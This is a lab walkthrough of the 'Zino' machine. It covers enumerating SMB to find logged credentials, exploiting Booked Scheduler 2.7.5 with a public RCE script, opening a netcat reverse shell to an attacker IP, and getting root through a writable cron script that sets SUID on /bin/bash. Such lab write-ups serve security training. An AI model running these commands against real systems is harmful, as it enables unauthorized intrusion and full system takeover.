---
icon: ubuntu
---

# Zino - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.159.64 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 03:22 EDT
Nmap scan report for 192.168.159.64
Host is up (0.031s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
|_  256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 10.3.24 or later (unauthorized)
8003/tcp open  http        Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.38 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.15 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-02T23:24:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -6h40m01s, deviation: 2h18m34s, median: -8h00m01s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2025-10-02T19:24:31-04:00

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   29.95 ms 192.168.45.1
2   29.66 ms 192.168.45.254
3   30.73 ms 192.168.251.1
4   32.57 ms 192.168.159.64
```

ftp does not have anonymous access enabled

### <mark style="color:blue;">SMB Enumeration</mark>

```
netexec smb 192.168.159.64 -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (860).png" alt=""><figcaption></figcaption></figure>

I am going to take a peak at the zino share, it's marked as Logs we might find something we can use here.

```
smbclient \\\\192.168.159.64\\zino -N
```

<figure><img src="../../.gitbook/assets/image (861).png" alt=""><figcaption></figcaption></figure>

the misc.log file contained some creds

<figure><img src="../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>

Nothing else Interesting I will check out port 8003

### <mark style="color:$primary;">HTTP Port 8003 TCP</mark>

<figure><img src="../../.gitbook/assets/image (863).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>

There is a version on the bottom for Booked Scheduler&#x20;

<figure><img src="../../.gitbook/assets/image (865).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Booked Scheduler 2.7.5 RCE \[Authenticated]</mark>

<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>

There is RCE for 2.7.5 I'll download it and try it out with the creds found earlier

```
searchsploit -m 50594.py
```

```
python3 50594.py http://192.168.159.64:8003 admin adminadmin
```

<figure><img src="../../.gitbook/assets/image (868).png" alt=""><figcaption></figcaption></figure>

I'll use nc to get a proper reverse shell

```
busybox nc 192.168.45.158 8003 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>

There is another user besides root I will keep that in mind while I am performing manual enumeration.

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>

Linpeas revealed a cronjob running as root every 3 minutes. Let's check what permissions we have on this script!

### <mark style="color:$primary;">Cronjob writable script -> root</mark>

<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>

We own it! I am going to replace it with a script that sets the SUID bit on /bin/bash

```
echo '__import__("os").system("chmod +s /bin/bash")' > cleanup.py
```

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

After root runs the script, /bin/bash will have the SUID bit set. root privileges are only one command away

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

We are root!
